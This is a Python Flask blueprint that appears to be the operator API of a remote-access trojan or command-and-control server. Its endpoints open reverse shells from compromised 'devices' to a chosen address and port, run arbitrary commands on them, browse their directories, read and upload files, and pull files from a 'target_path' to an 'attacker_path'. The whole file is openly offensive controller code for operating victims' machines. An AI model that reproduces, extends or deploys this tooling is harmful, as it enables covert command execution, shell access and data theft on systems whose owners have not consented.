from globals import *


def devices_enpoints(Handler):
    devices = Blueprint("devices", __name__, url_prefix="/devices")

    @devices.route("/revshell", methods=["POST"])
    def revshell():
        id = request.form.get("id")
        address = request.form.get("address")
        port = request.form.get("port")
        try:
            conn = Handler.get_device(id).revshell(address, port)
        except Exception as e:
            return jsonify({"status": "error", "message": "Couldn't open a Reverse Shell"})
        else:
            return jsonify({"status": "success", "message": "Reverse Shell Opened"})

    @devices.route("/rce", methods=["POST"])
    def rce():
        id = request.form.get("id")
        cmd = request.form.get("cmd")
        try:
            output = Handler.get_device(id).rce(cmd)
        except Exception as e:
            return jsonify({"status": "error", "message": str(e)})
        else:
            return jsonify({"status": "success", "message": output})

    @devices.route("/infos", methods=["GET"])
    def infos():
        id = request.args.get("id")
        output = Handler.get_device(id).infos()
        try:
            output = Handler.get_device(id).infos()
        except Exception as e:
            return jsonify({"status": "error", "message": str(e)})
        else:
            return jsonify({"status": "success", "message": output})

    @devices.route("/dir", methods=["GET"])
    def dir():
        id = request.args.get("id")
        dir = request.args.get("dir")
        try:
            output = Handler.get_device(id).get_directory_contents(dir)
        except Exception as e:
            return jsonify({"status": "error", "message": str(e)})
        else:
            return jsonify({"status": "success", "message": output})

    @devices.route("/file", methods=["GET"])
    def file():
        id = request.args.get("id")
        path = request.args.get("path")
        try:
            output = Handler.get_device(id).get_file_contents(path)
        except Exception as e:
            return jsonify({"status": "error", "message": str(e)})
        else:
            return jsonify({"status": "success", "message": output})

    @devices.route("/upload", methods=["POST"])
    def upload():
        id = request.form.get("id")
        fil = request.form.get("fil")
        path = request.form.get("path")
        try:
            output = Handler.get_device(id).file_upload(fil)
        except Exception as e:
            return jsonify({"status": "error", "message": str(e)})
        else:
            return jsonify({"status": "success", "message": output})

    @devices.route("/download", methods=["POST"])
    def download():
        id = request.form.get("id")
        target_path = request.form.get("target_path")
        attacker_path = request.form.get("attacker_path")
        try:
            output = Handler.file_download(
                id, target_path, attacker_path)
        except Exception as e:
            return jsonify({"status": "error", "message": str(e)})
        else:
            return jsonify({"status": "success", "message": output})

    @devices.route("/start", methods=["POST"])
    def start():
        address = request.form.get("address")
        port = request.form.get("port")
        try:
            Handler.start(address, port)
        except Exception as e:
            return jsonify({"status": "error", "message": str(e)}), 500
        else:
            return jsonify({"status": "success", "output": "Server started"}), 200

    @devices.route("/stop", methods=["POST"])
    def stop():
        try:
            Handler.stop()
        except Exception as e:
            return jsonify({"status": "error", "message": str(e)}), 500
        else:
            return jsonify({"status": "success", "output": "Server stopped"}), 200

    @devices.route("/connections", methods=["GET"])
    def connections():
        return jsonify({"status": "success", "output": Handler.connections}), 200
    return devices
